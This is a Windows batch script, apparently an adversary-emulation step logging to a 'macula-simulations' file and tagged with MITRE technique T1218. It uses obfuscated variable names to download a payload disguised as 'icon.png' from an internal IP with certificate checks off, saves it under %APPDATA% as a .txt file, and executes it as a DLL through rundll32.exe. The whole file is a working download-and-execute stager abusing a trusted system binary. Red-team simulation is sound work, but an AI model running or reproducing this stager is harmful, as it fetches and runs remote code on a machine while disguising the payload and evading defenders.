@echo off
setlocal enabledelayedexpansion

SET xqtjfn=%APPDATA%\10467\1cc45337
SET lmzbwv=7aa8e6ea.txt
SET hnvqax=https://10.0.0.49/stage/2/icon.png?10467-7
SET bjrwyz=BALAM-S2B
SET gklpcd=10467
SET efndrs=7

SET logvar=%APPDATA%\!efndrs!\macula-simulations.log
SET tsvar=!DATE! !TIME!

echo [!tsvar!][DEBUG][!bjrwyz!][!gklpcd!]: heartbeat_start>> "!logvar!" 2>nul

curl -k -s -o "!xqtjfn!\!lmzbwv!" "!hnvqax!"

echo [!tsvar!][DEBUG][!bjrwyz!][!gklpcd!]: heartbeat_complete>> "!logvar!" 2>nul

echo [!tsvar!][DEBUG][!bjrwyz!][!gklpcd!]: chdir_start>> "!logvar!" 2>nul

cd /d "!xqtjfn!" >nul 2>&1

echo [!tsvar!][DEBUG][!bjrwyz!][!gklpcd!]: chdir_result=!errorlevel!>> "!logvar!" 2>nul

echo [!tsvar!][DEBUG][!bjrwyz!][!gklpcd!]: rundll32_start>> "!logvar!" 2>nul

rundll32.exe !lmzbwv!, RunDLLW

if exist "!xqtjfn!\!lmzbwv!" (
    echo [!tsvar!][TTP][!bjrwyz!][!gklpcd!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logvar!" 2>nul
) else (
    echo [!tsvar!][TTP][!bjrwyz!][!gklpcd!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logvar!" 2>nul
)

endlocal